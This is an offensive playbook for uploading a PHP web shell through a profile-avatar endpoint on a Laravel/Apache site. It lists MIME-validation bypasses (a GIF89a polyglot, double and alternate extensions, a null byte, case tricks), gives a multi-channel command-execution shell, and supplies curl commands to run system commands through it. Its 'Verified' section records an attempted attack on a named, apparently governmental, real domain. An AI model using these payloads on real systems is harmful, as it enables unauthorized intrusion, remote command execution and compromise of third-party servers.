# Profile Avatar RCE — Public Directory Shell Upload

## Target Path
`/public/backend/images/avatars/` — this directory is OUTSIDE Apache's `/storage/` block.
Files here are directly accessible and PHP WILL execute if the extension is recognized.

## Upload Endpoint
`POST /upload_profile_picture` with multipart form:
- Field: `image` (file input, name="image")
- CSRF: from profile page meta tag or form `_token`
- Session: must have valid admin cookie

## MIME Bypass Techniques
The endpoint does MIME validation. Bypass approaches (ordered by success rate):

1. **GIF89a polyglot** (most reliable):
```php
GIF89a\x01\x00\x01\x00...;<?php system($_GET["c"]); ?>
```

2. **Double extension** — MIME check passes .jpg, Apache processes .php:
   - `shell.php.jpg` 
   - `shell.phtml.jpg`
   - `shell.php5.jpg`

3. **Alternate PHP handlers** — not in common blocklists:
   - `shell.pht`
   - `shell.php5`
   - `shell.php7`

4. **Null byte** (legacy PHP <5.3):
   - `shell.php%00.jpg`

5. **Case variations**:
   - `shell.PHP`
   - `shell.Php.jpg`

## Multi-Access Shell Payload
```php
GIF89a...;<?php 
if(isset($_GET["c"])){system($_GET["c"]);}
elseif(isset($_POST["c"])){system($_POST["c"]);}
elseif(isset($_SERVER["HTTP_X_CMD"])){system($_SERVER["HTTP_X_CMD"]);}
elseif(isset($_COOKIE["cmd"])){system($_COOKIE["cmd"]);}
else{echo"HEPH_OK";} 
?>
```

## Testing
After upload, test with:
```bash
curl "https://TARGET/public/backend/images/avatars/shell.php.jpg?c=id"
curl -X POST -d "c=whoami" "https://TARGET/public/backend/images/avatars/shell.php.jpg"
curl -H "X-CMD: hostname" "https://TARGET/public/backend/images/avatars/shell.php.jpg"
```

## Pitfall: Broken Endpoint
The `/upload_profile_picture` endpoint may return HTTP 500 even on valid images.
If so, check:
- Laravel error log at `/storage/logs/laravel.log` (often accessible)
- Try `/update_profile` with multipart (may ignore file but not crash)
- Look for alternate avatar upload via user creation/edit pages

## Verified
nactvet.go.tz (2026-06-03): `/upload_profile_picture` returns 500 on all inputs.
The endpoint has a server-side bug unrelated to MIME validation.
Alternate paths were explored: LFM `working_dir`, article image, video upload —
all go to `/storage/` which Apache blocks.